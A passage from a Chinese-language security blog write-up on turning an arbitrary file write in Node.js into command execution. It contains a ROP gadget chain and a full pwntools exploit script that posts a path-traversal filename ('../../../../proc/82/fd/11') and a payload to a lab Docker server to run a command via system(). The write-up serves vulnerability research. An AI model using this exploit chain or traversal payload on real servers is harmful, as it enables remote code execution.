rax</span><br><span class="line">.got:00000000064A6048 __assert_fail_ptr dq offset __assert_fail</span><br><span class="line">system_addr - __assert_fail_addr = <span class="number">0x17620</span></span><br><span class="line"></span><br><span class="line">pop_rax_rcx_ret = <span class="number">0x0000000002780d6d</span></span><br><span class="line">mov_rax_rcx_pop_rbx_r12_rbp_ret = <span class="number">0x0000000001526e68</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000029088e6</span></span><br><span class="line">mov_rax_rax_ret = <span class="number">0x00000000011b6524</span></span><br><span class="line">add_rax_rcx_ret = <span class="number">0x00000000016e1c42</span></span><br><span class="line">xor_r14b_ret = <span class="number">0x0000000002564072</span> </span><br><span class="line">jmp_rax = <span class="number">0x0000000002237647</span></span><br><span class="line">__assert_fail_got = <span class="number">0x00000000064A6048</span></span><br><span class="line">bss_addr = <span class="number">0x00000000064D1060</span></span><br><span class="line"></span><br><span class="line">content  = p64(<span class="number">0x3b49a48</span> - <span class="number">0x60</span>) + p64(<span class="number">0x1a9c210</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(bss_addr) + p64(cmd)</span><br><span class="line">content += p64(mov_rax_rcx_pop_rbx_r12_rbp_ret) + p64(rbx) + p64(r12) + p64(rbp)</span><br><span class="line">        ...                ...</span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(bss_addr) + p64(cmd)</span><br><span class="line">content += p64(mov_rax_rcx_pop_rbx_r12_rbp_ret) + p64(rbx) + p64(r12) + p64(rbp)</span><br><span class="line">content += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(__assert_fail_got) + p64(<span class="number">0x17620</span>)</span><br><span class="line">content += p64(mov_rax_rax_ret)</span><br><span class="line">content += p64(add_rax_rcx_ret)</span><br><span class="line">content += p64(xor_r14b_ret)</span><br><span class="line">content += p64(jmp_rax)</span><br></pre></td></tr></table></figure>

<p>完整<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">pop_rax_rcx_ret = <span class="number">0x0000000002780d6d</span></span><br><span class="line">mov_rax_rcx_pop_rbx_r12_rbp_ret = <span class="number">0x0000000001526e68</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000029088e6</span></span><br><span class="line">mov_rax_rax_ret = <span class="number">0x00000000011b6524</span></span><br><span class="line">add_rax_rcx_ret = <span class="number">0x00000000016e1c42</span></span><br><span class="line">xor_r14b_ret = <span class="number">0x0000000002564072</span></span><br><span class="line">jmp_rax = <span class="number">0x0000000002237647</span></span><br><span class="line">__assert_fail_got = <span class="number">0x00000000064A6048</span></span><br><span class="line">bss_addr = <span class="number">0x00000000064D1060</span></span><br><span class="line"></span><br><span class="line">content  = p64(<span class="number">0x3b49a48</span> - <span class="number">0x60</span>) + p64(<span class="number">0x1a9c210</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(bss_addr) + p64(<span class="number">0x742F206863756F74</span>)</span><br><span class="line">content += p64(mov_rax_rcx_pop_rbx_r12_rbp_ret) + p64(<span class="number">0x4141414141414141</span>) + p64(<span class="number">0x4141414141414141</span>) + p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0x3B67616C662F706D</span>)</span><br><span class="line">content += p64(mov_rax_rcx_pop_rbx_r12_rbp_ret) + p64(<span class="number">0x4141414141414141</span>) + p64(<span class="number">0x4141414141414141</span>) + p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line">content += p64(pop_rdi_ret) + p64(bss_addr)</span><br><span class="line">content += p64(pop_rax_rcx_ret) + p64(__assert_fail_got) + p64(<span class="number">0x17620</span>)</span><br><span class="line">content += p64(mov_rax_rax_ret)</span><br><span class="line">content += p64(add_rax_rcx_ret)</span><br><span class="line">content += p64(xor_r14b_ret)</span><br><span class="line">content += p64(jmp_rax)</span><br><span class="line"></span><br><span class="line">a = content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;content: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">data = &#123;<span class="string">&#x27;filename&#x27;</span>:<span class="string">&quot;../../../../proc/82/fd/11&quot;</span>,<span class="string">&quot;content&quot;</span>:content.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(json.dumps(data))</span></span><br><span class="line">resp = requests.post(<span class="string">&quot;http://172.17.0.2:3000/upload&quot;</span>,data = json.dumps(data),headers = &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-1740300436447.png" alt="img"></p>
<p>执行成功</p>
<p><img src="/images/image-1740300439274.png" alt="img"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>nodejs官方不认为这个是漏洞，所以这个将不会被修复</li>
<li>利用条件需要知道<code>pidof node</code>并且需要知道管道<code>id</code>总体实战利用价值不高</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://github.com/libuv/libuv/blob/fbe2d85bd5a5c370a8cacea92b3bdfbd9f98a530/src/unix/signal.c#L433">https://github.com/libuv/libuv/blob/fbe2d85bd5a5c370a8cacea92b3bdfbd9f98a530/src/unix/signal.c#L433</a></p>
<p><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/">https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/</a></p>
<p><a target="_blank" rel="noopener" href="https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html">https://bestwing.me/Exploiting%20File%20Writes%20in%20Hardened%20Environments.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=8FFsORk8snE">https://www.youtube.com/watch?v=8FFsORk8snE</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/k0mor3b1">Projects</a></li>
        
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">本地环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">docker环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.1.</span> <span class="toc-text">配置调试环境</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">任意文件写漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Read-only-file-system"><span class="toc-number">2.2.</span> <span class="toc-text">Read-only file system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Node-js-and-Pipes"><span class="toc-number">2.3.</span> <span class="toc-text">Node.js and Pipes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.4.</span> <span class="toc-text">构建结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2gadget"><span class="toc-number">2.5.</span> <span class="toc-text">搜索gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8B%E6%9C%8D-UTF-8-%E9%99%90%E5%88%B6"><span class="toc-number">2.6.</span> <span class="toc-text">克服 UTF-8 限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">漏洞调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">3.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&text=nodejs-从任意文件写到命令执行"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&is_video=false&description=nodejs-从任意文件写到命令执行"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=nodejs-从任意文件写到命令执行&body=Check out this article: http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&title=nodejs-从任意文件写到命令执行"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&name=nodejs-从任意文件写到命令执行&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/01/2024-11-01-nodejs-%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&t=nodejs-从任意文件写到命令执行"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k0mor3b1">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
